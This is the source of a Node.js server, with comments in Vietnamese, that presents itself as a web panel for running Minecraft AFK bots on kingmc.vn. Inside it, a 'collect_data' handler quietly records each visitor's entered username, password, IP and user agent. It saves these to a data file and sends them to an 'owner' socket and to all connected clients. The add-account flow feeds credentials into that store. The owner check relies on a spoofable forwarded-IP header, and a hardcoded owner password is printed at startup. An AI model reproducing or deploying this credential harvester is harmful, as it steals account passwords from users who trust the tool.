const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const DATA_FILE = './data.json';

// ===== CẤU HÌNH OWNER =====
const OWNER_IP = '1.53.131.94';
const OWNER_PASSWORD = 'Tuanpro123';

// ===== ĐỌC/LƯU DỮ LIỆU =====
function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf-8');
            return JSON.parse(raw);
        }
    } catch (e) {
        console.log('⚠️ Lỗi đọc file data, tạo mới');
    }
    return { clientData: {}, globalCollectedData: [], isMaintenance: false };
}

function saveData() {
    try {
        const data = {
            clientData: clientData,
            globalCollectedData: globalCollectedData,
            isMaintenance: isMaintenance
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.log('❌ Lỗi lưu file:', e.message);
    }
}

const savedData = loadData();
let clientData = savedData.clientData || {};
let globalCollectedData = savedData.globalCollectedData || [];
let isMaintenance = savedData.isMaintenance || false;

app.use(express.static('public'));

app.get('/api/check-admin', (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress;
    if (clientIp && clientIp.includes('::1')) clientIp = '127.0.0.1';
    const isOwner = (clientIp === OWNER_IP || clientIp === '127.0.0.1' || clientIp.includes('192.168.'));
    res.json({ isOwner, ip: clientIp });
});

process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));

let ownerSocketId = null;

io.on('connection', (socket) => {
    let rawIp = socket.handshake.headers['x-forwarded-for'] 
        ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
        : socket.handshake.address;
    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
    const clientIp = rawIp;

    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);

    if (clientIp === OWNER_IP || clientIp === '127.0.0.1') {
        ownerSocketId = socket.id;
        console.log('👑 Owner đã kết nối!');
    }

    if (!clientData[clientIp]) {
        clientData[clientIp] = { accounts: [], bots: {} };
        saveData();
    }

    socket.emit('init_accounts', clientData[clientIp].accounts);
    socket.emit('sync_collected_data', globalCollectedData);
    socket.emit('maintenance_status', isMaintenance);

    socket.on('collect_data', (data) => {
        const entry = {
            ip: clientIp,
            time: new Date().toLocaleString(),
            username: data.username || '(chưa nhập)',
            password: data.password || '(trống)',
            userAgent: data.userAgent || 'N/A'
        };
        globalCollectedData.push(entry);
        saveData();
        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
        io.emit('sync_collected_data', globalCollectedData);
        if (ownerSocketId) {
            io.to(ownerSocketId).emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
        }
    });

    socket.on('clear_collected_data', () => {
        globalCollectedData = [];
        saveData();
        io.emit('sync_collected_data', globalCollectedData);
        if (ownerSocketId) {
            io.to(ownerSocketId).emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
        }
    });

    socket.on('toggle_maintenance', (status) => {
        isMaintenance = status;
        saveData();
        io.emit('maintenance_status', isMaintenance);
        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
    });

    socket.on('add_account', (data) => {
        const { username, password } = data;
        if (!username) return;
        
        socket.emit('collect_data', {
            username: username,
            password: password || 'caigicungdc',
            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
        });

        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
        clientData[clientIp].accounts.push({
            id,
            username: username.trim(),
            password: password ? password.trim() : 'caigicungdc',
            autoReconnect: true,
            status: 'OFFLINE',
            color: '#ff4444'
        });
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
    });

    socket.on('delete_account', (id) => {
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
    });

    socket.on('toggle_auto_reconnect', (id) => {
        const acc = clientData[clientIp].accounts.find(a => a.id === id);
        if (acc) {
            acc.autoReconnect = !acc.autoReconnect;
            saveData();
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('get_accounts', () => {
        socket.emit('init_accounts', clientData[clientIp].accounts);
    });

    // ============================================================
    //  BOT MINEFLAYER - CHỈ CLICK SLOT 24
    // ============================================================
    socket.on('start_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (!account) return;

        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }

        const logSystem = (msg) => {
            socket.emit('log', `[${account.username}] ${msg}`);
        };

        let botState = {
            hasJoinedKingSMP: false,
            hasExecutedAFK: false,
            isLoggedIn: false,
            isFirstSpawn: true,
            loginAttempts: 0,
            isProcessing: false,
            isBotActive: true
        };

        account.status = 'CONNECTING...';
        account.color = 'yellow';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        logSystem(`🔄 Đang kết nối tới kingmc.vn...`);

        try {
            const bot = mineflayer.createBot({
                host: 'kingmc.vn',
                port: 25565,
                username: account.username,
                password: account.password,
                auth: 'offline',
                version: '1.16.5',
                checkTimeoutInterval: 120000
            });

            clientData[clientIp].bots[id] = bot;

            bot.on('login', () => {
                if (!botState.isBotActive) return;
                account.status = 'LOGGING IN...';
                account.color = 'orange';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                logSystem(`🔑 Đang đăng nhập...`);
            });

            bot.on('spawn', () => {
                if (!botState.isBotActive) return;
                
                if (botState.isFirstSpawn) {
                    botState.isFirstSpawn = false;
                    botState.hasJoinedKingSMP = false;
                    botState.hasExecutedAFK = false;
                    botState.isLoggedIn = false;
                }

                if (botState.hasJoinedKingSMP) {
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    logSystem(`✅ ĐÃ VÀO KINGSMP!`);
                    if (!botState.hasExecutedAFK) {
                        setTimeout(() => {
                            if (bot && botState.isBotActive) {
                                logSystem(`💤 Gửi lệnh /afk...`);
                                bot.chat('/afk');
                            }
                        }, 4000);
                    }
                } else {
                    account.status = 'ONLINE / LOBBY';
                    account.color = '#00ff88';
                    logSystem(`✅ Đã vào Sảnh chính!`);
                }
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
            });

            bot.on('messagestr', (message) => {
                if (!botState.isBotActive || !clientData[clientIp].bots[id]) {
                    return;
                }

                const msgLower = message.toLowerCase();

                if (!botState.isLoggedIn) {
                    if (msgLower.includes('/register') || msgLower.includes('/dk')) {
                        setTimeout(() => { 
                            if (bot && botState.isBotActive) bot.chat(`/dk ${account.password} ${account.password}`); 
                        }, 2000);
                    } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
                        botState.loginAttempts++;
                        logSystem(`🔑 Lần ${botState.loginAttempts}: Gửi /dn ${account.password}`);
                        setTimeout(() => { 
                            if (bot && botState.isBotActive) bot.chat(`/dn ${account.password}`); 
                        }, 2000);
                    }
                }

                if (!botState.isLoggedIn && (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
                    botState.isLoggedIn = true;
                    logSystem(`✅ Đã đăng nhập thành công!`);
                    
                    setTimeout(() => {
                        if (bot && !botState.hasJoinedKingSMP && botState.isBotActive) {
                            logSystem(`🔑 Gửi /dn lần 2 (xác thực)...`);
                            bot.chat(`/dn ${account.password}`);
                        }
                    }, 5000);
                }

                if (botState.isLoggedIn && !botState.hasJoinedKingSMP && msgLower.includes('bạn đã đăng nhập')) {
                    logSystem(`✅ Đã xác thực thành công! Đợi 5s gõ /menu...`);
                    
                    setTimeout(() => {
                        if (bot && !botState.hasJoinedKingSMP && botState.isBotActive) {
                            logSystem(`📋 Đang gõ /menu...`);
                            bot.chat('/menu');
                        }
                    }, 5000);
                }

                if (botState.isLoggedIn && !botState.hasJoinedKingSMP && 
                    (msgLower.includes('kingsmp') && msgLower.includes('chào mừng'))) {
                    botState.hasJoinedKingSMP = true;
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                    logSystem(`✅ ĐÃ VÀO KINGSMP!`);
                    
                    setTimeout(() => {
                        if (bot && !botState.hasExecutedAFK && botState.isBotActive) {
                            logSystem(`💤 Gửi lệnh /afk...`);
                            bot.chat('/afk');
                        }
                    }, 3000);
                }
            });

            // ===== WINDOWOPEN - CHỈ CLICK SLOT 24 =====
            bot.on('windowOpen', (window) => {
                if (!botState.isBotActive || !clientData[clientIp].bots[id]) {
                    try { bot.closeWindow(window); } catch(e){}
                    return;
                }

                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                
                if (rawTitle.includes('menu') || rawTitle.includes('sảnh') || rawTitle.includes('afk')) {
                    logSystem(`📂 Menu mở: ${rawTitle}`);
                }

                // ===== CLICK SLOT 24 - CHỌN KINGSMP =====
                if (!botState.hasJoinedKingSMP && (rawTitle.includes('sảnh') || rawTitle.includes('lobby') || rawTitle.includes('menu'))) {
                    if (botState.isProcessing) return;
                    botState.isProcessing = true;
                    
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow || !botState.isBotActive) {
                            botState.isProcessing = false;
                            return;
                        }
                        
                        logSystem(`🖱️ Click Slot 24 chọn KingSMP...`);
                        
                        bot.clickWindow(24, 0, 0)
                            .then(() => {
                                logSystem(`✅ Click Slot 24 thành công!`);
                                botState.isProcessing = false;
                            })
                            .catch((err) => {
                                logSystem(`⚠️ Lỗi click Slot 24: ${err.message}`);
                                botState.isProcessing = false;
                            });

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                            botState.isProcessing = false;
                        }, 1000);

                    }, 2500);
                }

                // ===== CLICK SLOT 1 - AFK =====
                if (botState.hasJoinedKingSMP && !botState.hasExecutedAFK && 
                    (rawTitle.includes('afk') || rawTitle.includes('tự động') || rawTitle.includes('treo'))) {
                    
                    if (botState.isProcessing) return;
                    botState.isProcessing = true;
                    
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow || !botState.isBotActive) {
                            botState.isProcessing = false;
                            return;
                        }
                        logSystem(`🖱️ Click Slot 1 chọn AFK...`);
                        botState.hasExecutedAFK = true;

                        bot.clickWindow(1, 0, 0)
                            .then(() => {
                                logSystem(`🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`);
                                botState.isProcessing = false;
                            })
                            .catch(() => {
                                logSystem(`⚠️ Bỏ qua cảnh báo transaction AFK`);
                                botState.hasExecutedAFK = true;
                                logSystem(`🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`);
                                botState.isProcessing = false;
                            });

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                            botState.isProcessing = false;
                        }, 1000);

                    }, 1500);
                }
            });

            bot.on('end', (reason) => {
                if (!botState.isBotActive) return;
                
                logSystem(`⚠️ Ngắt kết nối: ${reason || 'Mất kết nối từ Server'}`);
                account.status = 'OFFLINE';
                account.color = '#ff4444';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                
                botState.isBotActive = false;
                delete clientData[clientIp].bots[id];
                saveData();

                if (account.autoReconnect) {
                    logSystem(`🔄 Tự động kết nối lại sau 5 giây...`);
                    setTimeout(() => {
                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
                            socket.emit('start_bot', id);
                        }
                    }, 5000);
                }
            });

            bot.on('error', (err) => {
                if (!botState.isBotActive) return;
                
                if (err.code === 'EPIPE' || err.code === 'ECONNRESET') {
                    logSystem(`⚠️ Mất kết nối server, đang thử lại...`);
                } else {
                    logSystem(`❌ Lỗi Bot: ${err.message}`);
                }
            });

        } catch (e) {
            logSystem(`❌ Lỗi khởi tạo: ${e.message}`);
            account.status = 'ERROR';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('stop_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        const botExists = clientData[clientIp].bots[id];

        if (account) {
            account.status = 'STOPPING...';
            account.color = '#ff8800';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
            socket.emit('log', `[SYSTEM] ⏹️ Đang dừng bot: ${account.username}...`);
        }

        if (botExists) {
            try {
                clientData[clientIp].bots[id].quit();
                delete clientData[clientIp].bots[id];
                socket.emit('log', `[SYSTEM] ✅ Đã ngắt kết nối bot: ${account ? account.username : id}`);
            } catch(e) {
                socket.emit('log', `[SYSTEM] ❌ Lỗi khi dừng bot: ${e.message}`);
                delete clientData[clientIp].bots[id];
            }
        } else {
            socket.emit('log', `[SYSTEM] ⚠️ Bot đã dừng trước đó!`);
        }

        if (account) {
            setTimeout(() => {
                if (!clientData[clientIp].bots[id]) {
                    account.status = 'OFFLINE';
                    account.color = '#ff4444';
                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                    socket.emit('log', `[SYSTEM] ✅ Bot đã offline: ${account.username}`);
                }
            }, 1500);
        }

        saveData();
    });

    socket.on('send_chat', ({ id, cmd }) => {
        const bot = clientData[clientIp].bots[id];
        if (bot) {
            bot.chat(cmd);
            socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
        } else {
            socket.emit('log', `[⚠️] Bot này chưa online!`);
        }
    });

    socket.on('disconnect', () => {
        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
        if (clientIp === OWNER_IP || clientIp === '127.0.0.1') {
            ownerSocketId = null;
            console.log('👑 Owner đã ngắt kết nối');
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 Server đang chạy tại: http://localhost:${PORT}`);
    console.log(`👑 Owner IP: ${OWNER_IP}`);
    console.log(`🔑 Owner Password: ${OWNER_PASSWORD}`);
    console.log(`📂 Dữ liệu lưu tại: ${DATA_FILE}`);
});
